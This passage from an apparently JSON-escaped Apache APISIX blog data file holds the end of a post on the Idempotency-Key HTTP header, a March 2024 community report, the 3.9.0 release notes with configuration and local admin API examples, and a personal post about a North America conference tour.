from the system, whether the said entity exists or not, the end state will be the same: there will be no entity.\\n* **`POST` and `PATCH` are not idempotent**. For example, posting multiple times a new entity will create that many new entities.\\n\\n## A possible solution\\n\\nImagine that the client sending a request sends a unique key along. The server keeps track of key-request pairs. Overall, two things can happen:\\n\\n* The server already has a record of such a pair and discards the request\\n* The server has no such previous record and stores the pair\\n\\nIt\u2019s precisely the idea behind the IETF specification [The Idempotency-Key HTTP Header Field](https://datatracker.ietf.org/doc/html/draft-ietf-httpapi-idempotency-key-header-04). The `Idempotency-Key` HTTP header\u2019s value is a string; the specification uses a UUID as an example. It\u2019s the client\u2019s responsibility to generate such a value, which must be unique.\\n\\nThe spec describes the following flow:\\n\\n![Sequence diagram of the Idempotency Key](https://static.apiseven.com/uploads/2024/03/29/tZPye2d3_idempotency-key-sequence.png)\\n\\nThe specification mentions the server can optionally fingerprint the request, *i.e.*, hash it, and store the hash instead.\\n\\n## Error scenarios\\n\\nThe nominal path is pretty straightforward, but the specification also defines three possible error scenarios that can happen.\\n\\nHere they are:\\n\\n* The request doesn\'t provide the idempotency key for a documented idempotent operation requiring this header/400:\\n\\n    ```\\n    HTTP/1.1 400 Bad Request\\n    Content-Type: application/problem+json\\n    Content-Language: en\\n    {\\n      \\"type\\": \\"https://developer.example.com/idempotency\\",\\n      \\"title\\": \\"Idempotency-Key is missing\\",\\n      \\"detail\\": \\"This operation is idempotent and it requires correct usage of Idempotency Key.\\",\\n    }\\n    ```\\n\\n* Attempt to reuse an idempotency key with a different request payload/422:\\n\\n    ```\\n    HTTP/1.1 422 Unprocessable Content\\n    Content-Type: application/problem+json\\n    Content-Language: en\\n    {\\n      \\"type\\": \\"https://developer.example.com/idempotency\\",\\n      \\"title\\": \\"Idempotency-Key is already used\\",\\n      \\"detail\\": \\"This operation is idempotent and it requires\\n      correct usage of Idempotency Key. Idempotency Key MUST not be\\n      reused across different payloads of this operation.\\",\\n    }\\n    ```\\n\\n* Request is retried while the original request is still being processed/409:\\n\\n    ```\\n    HTTP/1.1 409 Conflict\\n    Content-Type: application/problem+json\\n    Content-Language: en\\n    {\\n      \\"type\\": \\"https://developer.example.com/idempotency\\",\\n      \\"title\\": \\"A request is outstanding for this Idempotency-Key\\",\\n      \\"detail\\": \\"A request with the same Idempotency-Key for the\\n                 same operation is being processed or is outstanding.\\"\\n    }\\n    ```\\n\\n## Conclusion\\n\\nDistributed systems are complex in part because if a call to a remote component times out, it\u2019s impossible to know whether it reached the said component. The only option is to repeat the call, but we risk executing a non-idempotent operation twice. In the realm of APIs, we can rely on the `Idempotency-Key` HTTP Header, an IETF specification currently in draft.\\n\\nFrom an architect\u2019s point of view, it makes sense to factor the behavior described in the above sequence diagram into a component, *i.e.*, an API Gateway. In a future post, I\u2019ll try implementing the behavior in Apache APISIX.\\n\\n**To go further:**\\n\\n* [Idempotency-Key HTTP Header Field](https://datatracker.ietf.org/doc/html/draft-ietf-httpapi-idempotency-key-header-04)"},{"id":"Monthly Report (March 01 - March 31)","metadata":{"permalink":"/blog/2024/04/01/monthly-report","source":"@site/blog/2024/04/01/monthly-report.md","title":"Monthly Report (March 01 - March 31)","description":"Our monthly Apache APISIX community report is your window into the project\'s monthly developments. It is a tool to facilitate your seamless integration into the Apache APISIX community, ensuring that you stay well-informed and actively involved.","date":"2024-04-01T00:00:00.000Z","formattedDate":"April 1, 2024","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.025,"truncated":true,"authors":[],"prevItem":{"title":"Fixing duplicate API requests","permalink":"/blog/2024/04/04/fix-duplicate-api-requests"},"nextItem":{"title":"Release Apache APISIX 3.9.0","permalink":"/blog/2024/03/29/release-apache-apisix-3.9.0"}},"content":"> We have recently made some additions and improvements to specific features within Apache APISIX. For detailed information, please read the monthly report.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'Many hands make light work\' rings true in our way, made possible by the collective dedication of our community.\\n\\nFrom 03.01 to 03.31, a total of 18 contributors made 48 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2024/04/01/8uuv5Xcl_contributors-202403.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2024/04/01/mgfkfvdx_new-contributors-202403.png)\\n\\n## Recent Highlights Features\\n\\n- [Support more sensitive fields for encryption](https://github.com/apache/apisix/pull/11095)\uff08Contributor: [shreemaan-abhishek](https://github.com/shreemaan-abhishek))\\n\\n- [Enable sensitive fields encryption by default](https://github.com/apache/apisix/pull/11076)\uff08Contributor: [shreemaan-abhishek](https://github.com/shreemaan-abhishek))\\n\\n- [Release 3.9.0](https://github.com/apache/apisix/pull/11061)\uff08Contributor: [shreemaan-abhishek](https://github.com/shreemaan-abhishek))\\n\\n- [Update lua-resty-t1k to 1.1.3 for chaitin-waf plugin](https://github.com/apache/apisix/pull/11029)\uff08Contributor: [blaisewang](https://github.com/blaisewang))\\n\\n- [Support to enable quic](https://github.com/apache/apisix/pull/10989)\uff08Contributor: [zll600](https://github.com/zll600))\\n\\n- [Add session.cookie configuration for openid-conect plugin](https://github.com/apache/apisix/pull/10919)\uff08Contributor: [illidan33](https://github.com/illidan33))\\n\\nThe official website and GitHub Issues of Apache APISIX have accumulated rich documentation tutorials and usage experiences. If you encounter any issues, you can refer to the documentation, search for keywords in Issues, or participate in discussions on Issues to share your ideas and practical experiences."},{"id":"Release Apache APISIX 3.9.0","metadata":{"permalink":"/blog/2024/03/29/release-apache-apisix-3.9.0","source":"@site/blog/2024/03/29/release-apache-apisix-3.9.0.md","title":"Release Apache APISIX 3.9.0","description":"The Apache APISIX 3.9.0 version is released on March 29, 2024. This release includes a few new features, bug fixes, and other improvements to user experiences.","date":"2024-03-29T00:00:00.000Z","formattedDate":"March 29, 2024","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":3.465,"truncated":true,"authors":[{"name":"Abhishek Choudhary","title":"Author","url":"https://github.com/shreemaan-abhishek","image_url":"https://github.com/shreemaan-abhishek.png","imageURL":"https://github.com/shreemaan-abhishek.png"},{"name":"Traky Deng","title":"Technical Writer","url":"https://github.com/kayx23","image_url":"https://github.com/kayx23.png","imageURL":"https://github.com/kayx23.png"}],"prevItem":{"title":"Monthly Report (March 01 - March 31)","permalink":"/blog/2024/04/01/monthly-report"},"nextItem":{"title":"Apache APISIX North America Tour","permalink":"/blog/2024/03/28/apisix-north-america-tour"}},"content":"We are glad to present Apache APISIX 3.9.0 with exciting new features, bug fixes, and other improvements to user experiences.\\n\\n\x3c!--truncate--\x3e\\n\\nThis new release adds a number of new features, including the support for HTTP/3 between client and APISIX, the addition of plugin reload endpoint to Control API, the configuration of Prometheus metrics expiration, and more.\\n\\nThere are a few important changes included in this release. Should you find these changes impacting your operations, please plan accordingly for a seamless upgrade.\\n\\n## Breaking Changes\\n\\n### Enable HTTP/2\\n\\nIn the earlier versions, HTTP/2 can be enabled by setting `apisix.node_listen.enable_http2` and `apisix.ssl.listen.enable_http2` to `true` in the configuration file. These options have been deprecated in this release. Starting from 3.9.0, HTTP/2 can be enabled with `apisix.enable_http2`:\\n\\n```yaml title=\\"config.yaml\\"\\napisix:\\n  enable_http2: true\\n```\\n\\nFor more information, see [PR #11032](https://github.com/apache/apisix/pull/11032).\\n\\n### Consolidate `keyring` and `key_encrypt_salt` fields\\n\\nIn the earlier versions, `key_encrypt_salt` and `keyring` are two configuration options both used for data encryption and decryption in a similar manner. This release removes `key_encrypt_salt` as it is redundant, and you should only configure `keyring`:\\n\\n```yaml title=\\"config.yaml\\"\\napisix:\\n  data_encryption:\\n    keyring:\\n      - qeddd145sfvddff3\\n```\\n\\nFor more information, see [PR #10771](https://github.com/apache/apisix/pull/10771).\\n\\n## New Features\\n\\n### Support HTTP/3 between client and APISIX\\n\\nSupport HTTP/3 between clients and APISIX as an experimental feature. HTTP/3 with upstream services is not yet supported.\\n\\nHTTP/3 requires TLS v1.3. To enable HTTP/3 on a given port in APISIX, update the configuration file as such:\\n\\n```yaml title=\\"config.yaml\\"\\napisix:\\n  ssl:\\n    listen:\\n      - port: 9443\\n        enable_http3: true\\n```\\n\\nNext, configure TLS certificates between client and APISIX:\\n\\n```shell\\ncurl \\"http://127.0.0.1:9180/apisix/admin/ssls\\" -X PUT \\\\\\n  -H \\"X-API-KEY: ${ADMIN_API_KEY}\\" \\\\\\n  -d \'{\\n    \\"id\\": \\"tls-client-ssl\\",\\n    \\"sni\\": \\"example.com\\",\\n    \\"cert\\": \\"\'\\"${server_cert}\\"\'\\",\\n    \\"key\\": \\"\'\\"${server_key}\\"\'\\"\\n  }\'\\n ```\\n\\nFor more information, see [PR #10989](https://github.com/apache/apisix/pull/10989), [PR #11010](https://github.com/apache/apisix/pull/11010), and [PR #11027](https://github.com/apache/apisix/pull/11027).\\n\\n### Add plugin reload endpoint to Control API\\n\\nThe plugin reload endpoint, which previously existed in Admin API to hot reload all plugins, is now added to [Control API](https://apisix.apache.org/docs/apisix/next/control-api/#put-v1pluginsreload), such that the plugin reload can be called from control plane:\\n\\n```shell\\ncurl \\"http://127.0.0.1:9090/v1/plugins/reload\\" -X PUT\\n```\\n\\nFor backward compatibility, the plugin reload endpoint in Admin API is retained.\\n\\nFor more information, see [PR #10905](https://github.com/apache/apisix/pull/10905).\\n\\n### Support setting session cookie lifetime in `openid-connect` plugin\\n\\nYou can now configure the session cookie lifetime in the `openid-connect` plugin as such:\\n\\n```shell\\ncurl \\"http://127.0.0.1:9180/apisix/admin/routes\\" -X PUT -d \'\\n{\\n  \\"id\\": \\"auth-with-oidc\\",\\n  \\"uri\\":\\"/anything/*\\",\\n  \\"plugins\\": {\\n    \\"openid-connect\\": {\\n      \\"client_id\\": \\"\'\\"$OIDC_CLIENT_ID\\"\'\\",\\n      \\"client_secret\\": \\"\'\\"$OIDC_CLIENT_SECRET\\"\'\\",\\n      \\"discovery\\": \\"\'\\"$OIDC_DISCOVERY\\"\'\\",\\n      \\"session\\": {\\n        \\"secret\\": \\"6S8IO+Pydgb33LIor8T9ClER0T/sglFAjClFeAF3RsY=\\",\\n        \\"cookie\\" : {\\n          \\"lifetime\\": 86400\\n        }\\n      },\\n      \\"redirect_uri\\": \\"http://localhost:9080/anything/callback\\"\\n    }\\n  },\\n  \\"upstream\\":{\\n    \\"type\\":\\"roundrobin\\",\\n    \\"nodes\\":{\\n      \\"httpbin.org:80\\":1\\n    }\\n  }\\n}\'\\n```\\n\\nThis is to address the issue where the lifetime of the access token is longer than the session lifetime.\\n\\nFor more information, see [PR #10919](https://github.com/apache/apisix/pull/10919).\\n\\n### Support setting expiration time for Prometheus metrics\\n\\nYou can now set the expiration time in seconds after Prometheus metrics have become inactive to reduce resource consumption:\\n\\n```yaml title=\\"config.yaml\\"\\nplugin_attr:\\n  prometheus:\\n    expire: 0    # time in seconds. 0 means the metrics will not expire.\\n```\\n\\nFor more information, see [PR #10869](https://github.com/apache/apisix/pull/10869).\\n\\n### Support `redis` and `redis-cluster` policies in `limit-req` and `limit-conn` plugins\\n\\nSupport `redis` and `redis-cluster` policies in `limit-req` and `limit-conn` plugins, so that rate limiting counters can be shared among APISIX instances.\\n\\nFor more information, see [PR #10874](https://github.com/apache/apisix/pull/10874) and [PR #10866](https://github.com/apache/apisix/pull/10866).\\n\\n### Support OCSP Stapling\\n\\nSupport OCSP stapling using the `ocsp-stapling` plugin.\\n\\nFor more information, see [plugin doc](https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/ocsp-stapling.md) and [PR #10817](https://github.com/apache/apisix/pull/10817).\\n\\n### Support transforming between HTTP and Dubbo\\n\\nSupport transforming between HTTP and Dubbo with the `http-dubbo` plugin.\\n\\nFor more information, see [PR #10703](https://github.com/apache/apisix/pull/10703).\\n\\n## Other Updates\\n\\n- Support EndpointSlice in Kubernetes service discovery ([PR #10916](https://github.com/apache/apisix/pull/10916))\\n- Add `cors_allow_headers` attribute to the `grpc-web` plugin to allow cross-origin resources ([PR #10904](https://github.com/apache/apisix/pull/10904))\\n- Allow customization of the error response code in the `forward-auth` plugin ([PR #10898](https://github.com/apache/apisix/pull/10898))\\n- Support the inclusion of request and response bodies in loggers ([PR #10888](https://github.com/apache/apisix/pull/10888))\\n- Support compressed responses in loggers ([PR #10884](https://github.com/apache/apisix/pull/10884))\\n- Support built-in variables in `response_headers` in the `mocking` plugin ([PR #10872](https://github.com/apache/apisix/pull/10872))\\n- Fix for unnecessary YAML config reloads ([PR #9065](https://github.com/apache/apisix/pull/9065))\\n- Prevent real payload to be overridden by malicious payload in the `jwt-auth` plugin ([PR #10982](https://github.com/apache/apisix/pull/10982))\\n\\n## Changelog\\n\\nFor a complete list of changes in this release, please see [CHANGELOG](https://github.com/apache/apisix/blob/master/CHANGELOG.md#390)."},{"id":"Apache APISIX North America Tour","metadata":{"permalink":"/blog/2024/03/28/apisix-north-america-tour","source":"@site/blog/2024/03/28/apisix-north-america-tour.md","title":"Apache APISIX North America Tour","description":"Once in a while, I write non-technical blog posts when I\'ve something worth sharing. Today, I\'d like to write about my North America \\"Tour\\" across several conferences and user groups.\\n","date":"2024-03-28T00:00:00.000Z","formattedDate":"March 28, 2024","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":9.885,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"Release Apache APISIX 3.9.0","permalink":"/blog/2024/03/29/release-apache-apisix-3.9.0"},"nextItem":{"title":"Monthly Report (January 29 - February 29)","permalink":"/blog/2024/03/05/monthly-report"}},"content":"<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/apisix-north-america-tour/\\" />\\n</head>\\n\\n>Once in a while, I write non-technical blog posts when I\'ve something worth sharing. Today, I\'d like to write about my North America \\"Tour\\" across several conferences and user groups.\\n\\n\x3c!--truncate--\x3e\\n\\nThe first leg of my journey started in Oakland, California, with [Developer Week](https://developerweek2024.sched.com/event/1WpId). Developer Week is an established conference with different editions in several locations and online during the year. Though I\'m on their advisory board, this is only the second time I\'ve spoken at one of their events. Pro-tip: Avoid being on any board of a conference where you speak. It\'s bad taste and casts doubt on whether you validated yourself.\\n\\nI flew from Geneva the day before my talk and crashed into my hotel bed. Of course, I woke up very early in the morning and decided to check the demo of a talk planned for the end of the tour. It didn\'t work, so I tried to remove the stopped containers. Tired as I was, I deleted **all** my Docker images, including the ones I\'d need a few hours later for my talk on [Open](https://blog.frankel.ch/end-to-end-tracing-opentelemetry/) [Telemetry](https://blog.frankel.ch/improve-otel-demo/)!\\n\\n<blockquote class=\\"twitter-tweet\\"><p lang=\\"en\\" dir=\\"ltr\\">Kicking off <a href=\\"https://twitter.com/DeveloperWeek?ref_src=twsrc%5Etfw\\">@DeveloperWeek</a> by learning about Telemetry from <a href=\\"https://twitter.com/nicolas_frankel?ref_src=twsrc%5Etfw\\">@nicolas_frankel</a> <a href=\\"https://t.co/rLCDPCzExV\\">pic.twitter.com/rLCDPCzExV</a></p>&mdash; Scott McAllister (@stmcallister) <a href=\\"https://twitter.com/stmcallister/status/1760397694282121559?ref_src=twsrc%5Etfw\\">February 21, 2024</a></blockquote> <script async src=\\"https://platform.twitter.com/widgets.js\\" charset=\\"utf-8\\"><\/script>\\n\\nThe talk is heavily based on a demo. When I tried to start the latter, I noticed the issue immediately and realized my mistake, but it was too late. Even though I had a Docker Compose file with `build` statements, one of the components is in Rust\u2014there was no time to compile it.\\n\\nLong story short, it was an epic fail. I apologize again for this to the attendees if any of them read this post; I hope the explanations and slides were enough for them to play with the GitHub repository.\\n\\nAfterward, my friend [Josh](https://mastodon.online/@starbuxman) drove me to San Francisco for lunch and a lovely walk along the piers.\\n\\n![Josh Long and Nicolas Fr\xe4nkel in San Francisco](https://static.apiseven.com/uploads/2024/03/26/Wyn1YAFH_IMG_8884_50.webp)\\n\\nThe next day, I woke early to fly to Montr\xe9al, Canada. It was a pretty long flight; the day after, I had to talks at [ConFoo](https://confoo.ca/en/speaker/nicolas-fraenkel), one of my favorite conferences in North America. ConFoo started as a PHP conference, hence the elephant mascot, but has now widened its horizon _a lot_.\\n\\n![ConFoo mascots](https://static.apiseven.com/uploads/2024/03/26/YG0Jjpjj_GHItGeSXwAEuU1z.jpg)\\n\\nI had two talks there: Open Telemetry (again) and [Chopping](https://blog.frankel.ch/chopping-monolith/) [the Monolith](https://blog.frankel.ch/chopping-monolith-smarter-way/). I had rebuilt my images, and both talks went flawlessly this time.\\n\\n<blockquote class=\\"twitter-tweet\\"><p lang=\\"en\\" dir=\\"ltr\\"><a href=\\"https://twitter.com/nicolas_frankel?ref_src=twsrc%5Etfw\\">@nicolas_frankel</a> talking about decomposing the monolith. The first step on the micro services journey is reorg /cc <a href=\\"https://twitter.com/adrianco?ref_src=twsrc%5Etfw\\">@adrianco</a> <a href=\\"https://t.co/YU6yFR8IJF\\">pic.twitter.com/YU6yFR8IJF</a></p>&mdash; Spencer Gibb (@spencergibb@social.sdf.org) (@spencerbgibb) <a href=\\"https://twitter.com/spencerbgibb/status/1761046658303877615?ref_src=twsrc%5Etfw\\">February 23, 2024</a></blockquote> <script async src=\\"https://platform.twitter.com/widgets.js\\" charset=\\"utf-8\\"><\/script>\\n\\nOver the weekend, my friend [Anthony](https://framapiaf.org/@anthonydahanne) invited me to ski in Sutton. The temperature was very low compared to what I\'m used to, around-10\xb0C. Fortunately, Anthony was prepared and gave me self-heating thingies for my hands; unfortunately, he only had one - but it was enough nonetheless. Anthony also connected me with all the meetups I have the pleasure of presenting at in Canada, so I\'m fortunate to count him as a friend.\\n\\n![Anthony Dahanne, his son and Nicolas Fr\xe4nkel in skiing gear](https://static.apiseven.com/uploads/2024/03/26/7VgErrYQ_GHItGeXWoAAXzNR.jpg)\\n\\nHaving survived the Canadian cold, I ran one of my favourite runs on Monday: from the Bonaventure Hotel to the top of the Mount Royal. The slope is pretty steep at the foot of the mount, so you either choose to use the twisty path to the top or the multiple stairs that cut a more direct route. I managed to use all the stairs but the last (and longest) one and caught my breath running along the regular path.\\n\\n![Nicolas Fr\xe4nkel on top of Mont Royal with Montr\xe9al in the background](https://static.apiseven.com/uploads/2024/03/26/Kw3W7lNo_GHOBEWkWIAAQ-Zf.jpg)\\n\\nIn the evening of the same day, I talked at the [Software Crafters Montr\xe9al](https://www.meetup.com/fr-FR/software-crafters-montreal/events/298710071/) meetup. It\'s interesting because though I\'ve been a developer for a long time, I never belonged to the \\"crafter\\" movement, though it resonates. The talk chosen was [Evolving your APIs](https://blog.frankel.ch/evolve-apis/). The room was packed, and I believe it was pretty well received.\\n\\n![Software Crafters Montr\xe9al meetup](https://static.apiseven.com/uploads/2024/03/26/N7Ehs8CW_GHWe9eLWMAAsKUe.jpg)\\n\\nThe next step in my journey was the [Ottawa Java User Group](https://www.meetup.com/ottawa-java-user-group/events/299043919). I spent most of my developer years on the JVM, so my network is quite developed among JUGs. The organizer is [Sebastien Pelletier](https://www.linkedin.com/in/pelletis/): he\'s been accommodating and has driven me from my hotel and back again. He\'s trying to rebuild the Ottawa JUG back to its pre-COVID attendance. If you\'re a speaker and plan to be around Ottawa, please get in touch with him: his organizational skills are second to none.\\n\\n<blockquote class=\\"twitter-tweet\\"><p lang=\\"en\\" dir=\\"ltr\\">I had the pleasure of watching <a href=\\"https://twitter.com/nicolas_frankel?ref_src=twsrc%5Etfw\\">@nicolas_frankel</a> speak at <a href=\\"https://twitter.com/realOttawaJUG?ref_src=twsrc%5Etfw\\">@realOttawaJUG</a> this evening. The room was packed!! <a href=\\"https://t.co/XEotZOh95E\\">pic.twitter.com/XEotZOh95E</a></p>&mdash; Theresa Mammarella (@t_mammarella) <a href=\\"https://twitter.com/t_mammarella/status/1762628620193775717?ref_src=twsrc%5Etfw\\">February 27, 2024</a></blockquote> <script async src=\\"https://platform.twitter.com/widgets.js\\" charset=\\"utf-8\\"><\/script>\\n\\nOttawa is located between Montr\xe9al and Toronto, so the [Toronto JUG](https://www.meetup.com/toronto-java-users-group/events/298952265/) was a logical step in my tour. I stayed for a couple of days, including the weekend, so I had time to explore the city, including the CN Tower, as it was my first time there. [Therese Mammarella](https://mastodon.social/@t_mammarella) is the organizer there, and I\'m sure she\'ll be happy to host you. You may have noticed she liked my talks so much that she drove to Ottawa on purpose the week before to attend the one I did at the JUG. The talk was well-attended but less than I expected for a city of this size. Anyway, I had a lot of fun presenting Evolving your APIs - I hope the attendees had too.\\n\\n<blockquote class=\\"twitter-tweet\\"><p lang=\\"en\\" dir=\\"ltr\\">Great have <a href=\\"https://twitter.com/nicolas_frankel?ref_src=twsrc%5Etfw\\">@nicolas_frankel</a> drop into the <a href=\\"https://twitter.com/hashtag/Toronto?src=hash&amp;ref_src=twsrc%5Etfw\\">#Toronto</a> JUG on his <a href=\\"https://twitter.com/hashtag/APISIXNorthAmericaTour?src=hash&amp;ref_src=twsrc%5Etfw\\">#APISIXNorthAmericaTour</a>! <a href=\\"https://t.co/KcRhA2nOpm\\">pic.twitter.com/KcRhA2nOpm</a></p>&mdash; Shaun Smith \ud83c\udde8\ud83c\udde6\u2764\ufe0f\ud83c\uddfa\ud83c\udde6 (@shaunmsmith) <a href=\\"https://twitter.com/shaunmsmith/status/1764812180992426409?ref_src=twsrc%5Etfw\\">March 5, 2024</a></blockquote> <script async src=\\"https://platform.twitter.com/widgets.js\\" charset=\\"utf-8\\"><\/script>\\n\\nToronto is quite close to Niagara Falls. It would have been a shame not to go there, but I felt sick the weekend, so I decided to skip it. Yet, some things are just bound to happen. After the talk, a couple of us went to have dinner. There, I met a Ukrainian guy who had moved to Toronto years before the war and knew about me and my support for Ukraine. After talking together, we realized we had friends in common. He offered to drive me there as he was not working the next day. I happily took a day off myself and didn\'t regret it one bit! Thanks, Ihor, for the drive and the conversation.\\n\\n![Nicolas Fr\xe4nkel with Niagara Falls and a rainbow in the background](https://static.apiseven.com/uploads/2024/03/26/CgcCvJfC_GH8m0dEWUAAm3eJ.jpg)\\n\\nAfterward, I returned to the USA, namely Chicago, Illinois, to speak at [Chicago JUG](https://www.meetup.com/chicagojug/events/299412641/). I have known the JUG leader, [Mary Grygleski](https://mastodon.social/@mgrygles), for over a decade. She took the time to organize the meetup despite her busy schedule.\\n\\n<blockquote class=\\"twitter-tweet\\"><p lang=\\"en\\" dir=\\"ltr\\">Our meetup with the amazing <a href=\\"https://twitter.com/nicolas_frankel?ref_src=twsrc%5Etfw\\">@nicolas_frankel</a> has just started <a href=\\"https://twitter.com/hashtag/ApacheAPISIX?src=hash&amp;ref_src=twsrc%5Etfw\\">#ApacheAPISIX</a>! Thanks <a href=\\"https://twitter.com/IBM?ref_src=twsrc%5Etfw\\">@IBM</a>-Chicago <a href=\\"https://twitter.com/arunavaibm?ref_src=twsrc%5Etfw\\">@arunavaibm</a> for hosting us tonight, and <a href=\\"https://twitter.com/ChehHoo?ref_src=twsrc%5Etfw\\">@ChehHoo</a> @software29927 for helping! There&#39;s still time to join us: <a href=\\"https://t.co/qiy8WXYXBR\\">https://t.co/qiy8WXYXBR</a> <a href=\\"https://t.co/9iiCtvPT4a\\">pic.twitter.com/9iiCtvPT4a</a></p>&mdash; Mary Grygleski (@mgrygles) <a href=\\"https://twitter.com/mgrygles/status/1765903150668517579?ref_src=twsrc%5Etfw\\">March 8, 2024</a></blockquote> <script async src=\\"https://platform.twitter.com/widgets.js\\" charset=\\"utf-8\\"><\/script>\\n\\n[Matt Raible](https://github.com/mraible) is a familiar face in the Java community - and beyond. He\'s also the leader of the Denver Java User Group. I was lucky to know him, as he also arranged a double hit: [Boulder](https://www.meetup.com/boulderjavausersgroup/events/299454075/), then [Denver](https://www.meetup.com/denverjavausersgroup/events/gjngbtygcfbrb/). Even better, [Venkat Subramaniam](https://mastodon.social/@venkats), whom I don\'t need to introduce, lives close to Boulder **and** was there to invite me for a hike. But before that, I spend my weekend hiking according to his suggestion. First, I went to Boulder Moutain Park, and then, the day after, I went to Lake Bernard.\\n\\n![Nicolas Fr\xe4nkel in the Colorado mountains](https://static.apiseven.com/uploads/2024/03/26/SStMBJvP_GIbjAqvXEAA3Is2.jpg)\\n\\nThe not-so-fun part about the second hike: for a reason unknown, mid-way, my head started to hurt. The headache lasted for the whole day. I checked online, and since I had my water bag and kept drinking, it might have been mountain sickness. It\'s weird since I live close to the mountains and go on top regularly, but it\'s the only explanation I could find. Fortunately, it went away the next day, and the talks went well.\\n\\n<blockquote class=\\"twitter-tweet\\"><p lang=\\"en\\" dir=\\"ltr\\">March <a href=\\"https://twitter.com/denverjug?ref_src=twsrc%5Etfw\\">@denverjug</a> - <a href=\\"https://twitter.com/nicolas_frankel?ref_src=twsrc%5Etfw\\">@nicolas_frankel</a> discussing \u201cEvolving your APIs, a pragmatic approach\u201d at Thrive in Cherry Creek. <a href=\\"https://t.co/cOksUDihVm\\">pic.twitter.com/cOksUDihVm</a></p>&mdash; Greg Ostravich (@GregOstravich) <a href=\\"https://twitter.com/GregOstravich/status/1768070218855612800?ref_src=twsrc%5Etfw\\">March 14, 2024</a></blockquote> <script async src=\\"https://platform.twitter.com/widgets.js\\" charset=\\"utf-8\\"><\/script>\\n\\nIt was time for me to leave for the last leg of my journey, the [Southern California Linux Expo](https://www.socallinuxexpo.org/scale/21x/presentations/back-basics-getting-traffic-your-kubernetes-cluster) in Pasadena. Before that, life took an interesting turn of events: the forecast warned about a snowstorm in the area. The airline rebooked me twice: from 6 AM to 7 AM, then from 7 AM to 11 AM. I was lucky enough to get a seat, and though spraying the plane with unfreezing liquid took a bit of time, it managed to leave anyway. I left Denver under the snow and landed a handful of hours later in Los Angeles under the sun.\\n\\nIt was my second time at SCaLE, _aka_, SoCalLinux; the first time was the year of Covid. I need to explain why speaking at SCaLE during this journey was necessary. At the time, I was to speak at two different meetups in San Francisco, then SCaLe, fly to Romania, then Istanbul, get back home on Saturday, and leave on Monday for Australia. Granted, it was not terrific planning, but I like to think that I lived and learned since then. Anyway, one of the meetups was canceled, and I did the other online from my hotel room. At SCaLe, the venue was pretty empty for an event this size. Some people were wearing masks, and antiseptic gel dispensers were everywhere. I had around ten people in my room, which was my record at the time - I\'ve done worse since then.\\n\\nLater, the Romanian conference announced they would cancel the event. I called the Istanbul one, but they confirmed the event would occur. I rebooked to Istanbul, then one day later, they canceled as well. When life gives you lemons, you make lemonade; I decided to keep it that way to avoid more rebooking fees and spend the days in Istanbul anyway.\\n\\n![A mosque in Istanbul](https://static.apiseven.com/uploads/2024/03/26/Kc2z1PSm_20200313_175252.jpg)\\n\\nFor the record, on Sunday, the whole world stopped. The Australian conference was also canceled, and I had no chance to go there since. Thus, that was what went in my head by preparing for my talk at SCaLE: I wanted to exorcise my previous experience. I\'m happy to say it worked!\\n\\n<blockquote class=\\"twitter-tweet\\"><p lang=\\"en\\" dir=\\"ltr\\"><a href=\\"https://twitter.com/nicolas_frankel?ref_src=twsrc%5Etfw\\">@nicolas_frankel</a> is starting a great talk on the basics of network traffic options on Kubernetes at <a href=\\"https://twitter.com/hashtag/Scale21x?src=hash&amp;ref_src=twsrc%5Etfw\\">#Scale21x</a> in the <a href=\\"https://twitter.com/hashtag/kcdla?src=hash&amp;ref_src=twsrc%5Etfw\\">#kcdla</a> track in ballroom B <a href=\\"https://twitter.com/socallinuxexpo?ref_src=twsrc%5Etfw\\">@socallinuxexpo</a> <a href=\\"https://t.co/vIQckW5QYt\\">pic.twitter.com/vIQckW5QYt</a></p>&mdash; Steve Wong (@cantbewong) <a href=\\"https://twitter.com/cantbewong/status/1768725626306150526?ref_src=twsrc%5Etfw\\">March 15, 2024</a></blockquote> <script async src=\\"https://platform.twitter.com/widgets.js\\" charset=\\"utf-8\\"><\/script>\\n\\nBefore leaving for home, though, I met with my friends from Yugabites: [Denis Magda](https://github.com/dmagda) and [Franck Pachot](https://mastodon.social/@FranckPachot). We had lunch, then enjoyed an hour or so walking on the shore of Venice Beach. Here, you can see them counting on their fingers:\\n\\n![Nicolas Fr\xe4nkel, Franck Pachot, and Denis Magda (left to righ) on Venice Beach](https://static.apiseven.com/uploads/2024/03/26/U4yG3DDI_GIwX6QxWUAALNkz.jpg)\\n\\nDid you notice that you count on your fingers differently depending on where you were raised? Hint: find out how the English spies unwillingly reveal themselves in the Inglorious Basterds movie, despite speaking flawless German.\\n\\nIt was time to get home after this last pause on American soil. Many hours later, I was at home, tired but happy from all those events. Many thanks to all the organizers who made them possible, especially Anthony, who worked as my agent for Canada. I also want to thank the people who came to my talks: speakers are nobody if there\'s no audience to listen to them. Finally, I want to thank my employer [api7.ai](https://api7.ai/), who made it all possible.\\n\\nSee you soon [somewhere](https://blog.frankel.ch/speaking/)!\\n\\nPS: I tried to document my journey via #APISIXNorthAmericaTour. Find more pictures on [Twitter](https://twitter.com/search?q=%23APISIXNorthAmericaTour&src=typed_query&f=live), [LinkedIn](https://www.linkedin.com/search/results/all/?keywords=%23APISIXNorthAmericaTour&origin=GLOBAL_SEARCH_HEADER), [Mastodon](https://mastodon.top/tags/APISIXNorthAmericaTour) and [BlueSky](https://bsky.app/search?q=%23APISIXNorthAmericaTour)."},{"id":"Monthly Report (January 29 - February 29)","metadata":{"permalink":"/blog/2024/03/05/monthly-report","source":"@site/blog/2024/03/05/monthly-report.md","title":"Monthly Report (January 29 - February 29)","description":"Our monthly Apache APISIX community report is your window into the project\'s monthly developments. It is a tool to facilitate your seamless integration into the Apache APISIX community, ensuring that you stay well-informed and actively 